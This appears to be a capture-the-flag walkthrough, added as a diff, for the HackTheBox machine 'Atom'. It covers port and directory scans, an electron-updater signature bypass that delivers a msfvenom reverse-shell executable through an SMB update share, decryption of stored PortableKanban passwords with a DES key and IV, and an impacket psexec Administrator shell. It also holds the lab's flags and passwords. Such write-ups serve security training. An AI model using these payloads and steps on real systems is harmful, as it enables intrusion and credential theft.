@@ -1,0 +1,304 @@
+Machine-Name  : Atom
+IP-Address    : 10.129.193.123
+
+Command-Line: sudo nmap -p- -A -T4 10.129.193.123
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-30 20:30 EDT
+    Nmap scan report for 10.129.193.123
+    Host is up (0.051s latency).
+    Not shown: 65528 filtered ports
+    PORT     STATE SERVICE      VERSION
+    80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+    | http-methods:
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+    |_http-title: Heed Solutions
+    135/tcp  open  msrpc        Microsoft Windows RPC
+    443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+    | http-methods:
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+    |_http-title: Heed Solutions
+    | ssl-cert: Subject: commonName=localhost
+    | Not valid before: 2009-11-10T23:48:47
+    |_Not valid after:  2019-11-08T23:48:47
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn:
+    |_  http/1.1
+    445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+    5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    |_http-server-header: Microsoft-HTTPAPI/2.0
+    |_http-title: Not Found
+    6379/tcp open  redis        Redis key-value store
+    7680/tcp open  tcpwrapped
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Device type: general purpose
+    Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
+    OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
+    Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    Host script results:
+    |_clock-skew: mean: 2h20m01s, deviation: 4h02m29s, median: 1s
+    | smb-os-discovery:
+    |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+    |   OS CPE: cpe:/o:microsoft:windows_10::-
+    |   Computer name: ATOM
+    |   NetBIOS computer name: ATOM\x00
+    |   Workgroup: WORKGROUP\x00
+    |_  System time: 2021-07-30T17:32:40-07:00
+    | smb-security-mode:
+    |   account_used: guest
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: disabled (dangerous, but default)
+    | smb2-security-mode:
+    |   2.02:
+    |_    Message signing enabled but not required
+    | smb2-time:
+    |   date: 2021-07-31T00:32:42
+    |_  start_date: N/A
+
+    TRACEROUTE (using port 135/tcp)
+    HOP RTT      ADDRESS
+    1   50.00 ms 10.10.14.1
+    2   50.20 ms 10.129.193.123
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 160.75 seconds
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://10.129.193.123
+Result:
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 247836
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.193.123/_21-07-30_21-02-21.txt
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-07-30_21-02-21.log
+
+    Target: http://10.129.193.123/
+
+    [21:02:21] Starting:
+    [21:02:21] 403 -  304B  - /cgi-bin/
+    [21:02:21] 403 -  304B  - /.html
+    [21:02:21] 200 -  986B  - /images/
+    [21:02:21] 301 -  342B  - /images  ->  http://10.129.193.123/images/
+    [21:02:21] 403 -  304B  - /.htm
+    [21:02:23] 403 -  304B  - /webalizer/
+    [21:02:23] 403 -  304B  - /webalizer
+    [21:02:23] 301 -  342B  - /Images  ->  http://10.129.193.123/Images/
+    [21:02:23] 200 -  986B  - /Images/
+    [21:02:24] 200 -    7KB - /.
+    [21:02:24] 403 -  304B  - /phpmyadmin/
+    [21:02:24] 403 -  304B  - /phpmyadmin
+    [21:02:25] 200 -   73KB - /icons/
+    [21:02:35] 403 -  304B  - /.htc
+    [21:02:35] 301 -  344B  - /releases  ->  http://10.129.193.123/releases/
+    [21:02:35] 200 - 1007B  - /releases/
+    [21:02:39] 301 -  342B  - /IMAGES  ->  http://10.129.193.123/IMAGES/
+    [21:02:39] 200 -  986B  - /IMAGES/
+
+Browser: http://atom.htb/releases
+Notes: Downloaded zip file. Unzipped.
+Result:
+    ./heed
+
+Command-Line: smbclient -N -L \\10.129.193.123
+Result:
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Software_Updates Disk
+        SMB1 disabled -- no workgroup available
+
+Command-Line: smbget -H smb://10.129.193.123/Software_Updates
+Result:
+    ./Software_Updates/
+Notes: Found .pdf file and other empty folders. Opening .pdf.
+Result:
+    ./Software_Updates/UAT_Testing_Procedures.pdf
+    Heedv1.0
+    Internal QA Documentation
+    What is Heed ?
+        Note taking application built with electron-builder which helps users in taking important
+        notes.
+    Features ?
+        Very limited at the moment. There’s no server interaction when creating notes. So
+        currently it just acts as a one-tier thick client application. We are planning to move it to a
+        full fledged two-tier architecture sometime in the future releases.
+    What about QA ?
+        We follow the below process before releasing our products.
+        1. Build and install the application to make sure it works as we expect it to be.
+        2. Make sure that the update server running is in a private hardened instance. To
+        initiate the QA process, just place the updates in one of the "client" folders, and]\
+        the appropriate QA team will test it to ensure it finds an update and installs it
+        correctly.
+        3. Follow the checklist to see if all given features are working as expected by the
+        developer.
+
+Notes: A note taking application built with "electron-builder".
+Command-Line: ~/HTB/Machines/Atom_NF/heed/heed-pluginsdir/app-64/resources$ cat app-update.yml
+Result:
+    provider: generic
+    url: 'http://updates.atom.htb'
+    publisherName:
+      - HackTheBox
+
+Notes: Added "updates.atom.htb" to /etc/hosts. No noticeable changes.
+
+Browser: Electron-builder exploit.
+URL: https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
+Notes: Electron-builder vulnerable through a mistake in it's .yml file.
+Result:
+    ./exploit/latest.yml
+Notes: Changed sha512 signature, size, path, and release-date inside latest.yml.
+
+Notes: Creating an unstaged reverse shell payload.
+Command-Line: sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=<tun0> LPORT=9001 -f exe -o rev.exe
+Result:
+    ./exploit/rev.exe
+
+Command-Line: sha512sum rev.exe |awk '{print $1}' | xxd -r -p | base64 -w 0
+Result:
+    M0dWwgnc+0Rntq5Q5AZ08bJ5vOzfBp0dtFwzbv08x43YYxDG/UHfaTMPxaElAnLdLQ3ICa22alSRAHMixO8c0g==
+Notes: Added new base64 encoding and size of rev.exe to latest.yml. Path is rev.exe.
+
+Command-Line: smbclient //10.129.193.123/Software_Updates
+Result:
+    password: <clicked Enter>
+
+Command-Line: nc -lvnp 9001
+
+smb :> cd client1
+smb :> put latest.yml
+smb :> put rev.exe r'ev.exe
+
+Notes: Waited for rev.exe to be executed by SMB. The nc listener caught the execution and gave a reverse shell.
+Result:
+    *** REVERSE SHELL ***
+    *** USER ACCESS ***
+    C:\WINDOWS\system32>
+
+C:\WINDOWS\system32>whoami
+Result:
+    whoami
+    atom\jason
+
+C:\WINDOWS\system32>cd ../../Users/jason/Desktop
+Result:
+    cd ../../Users/jason/Desktop
+
+C:\Users\jason\Desktop>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 9793-C2E6
+
+     Directory of C:\Users\jason\Desktop
+
+    04/02/2021  10:29 PM    <DIR>          .
+    04/02/2021  10:29 PM    <DIR>          ..
+    03/31/2021  02:09 AM             2,353 heedv1.lnk
+    03/31/2021  02:09 AM             2,353 heedv2.lnk
+    03/31/2021  02:09 AM             2,353 heedv3.lnk
+    08/04/2021  09:24 AM                34 user.txt
+                   4 File(s)          7,093 bytes
+                   2 Dir(s)   5,591,564,288 bytes free
+
+C:\Users\jason\Desktop>type user.txt
+Result:
+    type user.txt
+    a630761a3e770b18fdbac632b173eaad
+    *** USER OWNED ***
+
+Notes: Found Redis folder. Typed out the contents and found a password.
+C:\Program Files\Redis>type redis.windows.conf
+Result:
+    # Redis configuration file example
+    requirepass kidvscat_yes_kidvscat
+
+Notes: Also found PortableKanban in the jason/Downloads repository. The config file revealed an encrypted password.
+Result:
+    "DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb"
+
+Command-Line: echo -n Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb | base64 -d
+Result:
+    No Error Messages.
+Notes: This is most likely base64 encoded first, then use DES with IV and KEY.
+
+DES-IV: XuVUm5fR
+DES-KEY: 7ly6UznJ
+
+Notes: Writing custom python3 script to decode.
+Result:
+    ./decrypt_kanban.py
+
+Command-Line: python3 decrypt_kanban.py
+Result:
+    b'kidvscat_yes_kidvscat'
+
+Notes: This is the same password found in the Redis repo.
+
+Command-Line: redis-cli -h 10.129.193.123
+Result:
+    10.129.193.123:6379>
+
+10.129.193.123:6379> auth kidvscat_yes_kidvscat
+Result:
+    OK
+
+10.129.193.123:6379>keys *
+Result:
+    1) "pk:ids:MetaDataClass"
+    2) "pk:ids:User"
+    3) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
+    4) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
+
+10.129.193.123:6379> get "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
+Result:
+    "{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
+
+Notes: EncryptedPassword is placed as input in ./decrypt_kanban.py.
+Results:
+    b'kidvscat_admin_@123'
+
+Notes: Needed to download impacket to acquire impacket-example dependencies.
+Download-URL: https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_23
+URL: https://github.com/SecureAuthCorp/impacket
+Notes: Unpacked impacket, then installed with following command once in the impacket root directory:
+
+Command-Line: python3 -m pip install .
+Result:
+    Installation successful.
+
+Command-Line: /usr/share/doc/python3-impacket/examples/psexec.py .
+Command-Line: python3 psexec.py administrator@10.129.193.123
+Result:
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+    [*] Requesting shares on 10.129.193.123.....
+    [*] Found writable share ADMIN$
+    [*] Uploading file XLHwhHMj.exe
+    [*] Opening SVCManager on 10.129.193.123.....
+    [*] Creating service eujd on 10.129.193.123.....
+    [*] Starting service eujd.....
+    [!] Press help for extra shell commands
+    Microsoft Windows [Version 10.0.19042.906]
+    (c) Microsoft Corporation. All rights reserved.
+
+    C:\WINDOWS\system32>
+    *** ROOT ACCESS ***
+
+C:\WINDOWS\system32> cd ../../Users/Administrator/Desktop
+C:\Users\Administrator\Desktop>type root.txt
+Result:
+    3c6d7d0555701a19dd4527ef67a1d3d1
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
